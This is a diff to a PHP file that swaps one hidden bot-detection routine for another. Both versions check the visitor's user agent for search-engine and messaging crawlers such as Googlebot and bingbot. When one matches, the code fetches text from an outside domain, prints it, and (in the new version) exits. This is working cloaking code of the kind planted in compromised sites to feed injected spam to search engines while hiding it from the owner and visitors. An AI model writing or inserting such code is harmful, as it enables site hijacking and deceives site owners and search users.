@@ -1,25 +1,22 @@
 <?php
-
-function profile_user() {
-    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
-    $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://jasamarga.org/elemir/';
-    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
-
-    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        $content = curl_exec($ch);
-        curl_close($ch);
-
-        echo $content;
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
     }
+    
+    return false;
 }
 
-profile_user();
+if (is_bot()) {
+    $message = file_get_contents('https://blackyes.ink/landing/elemir.txt');
+    echo $message;
+exit;
+}
 ?>
 
 <?php
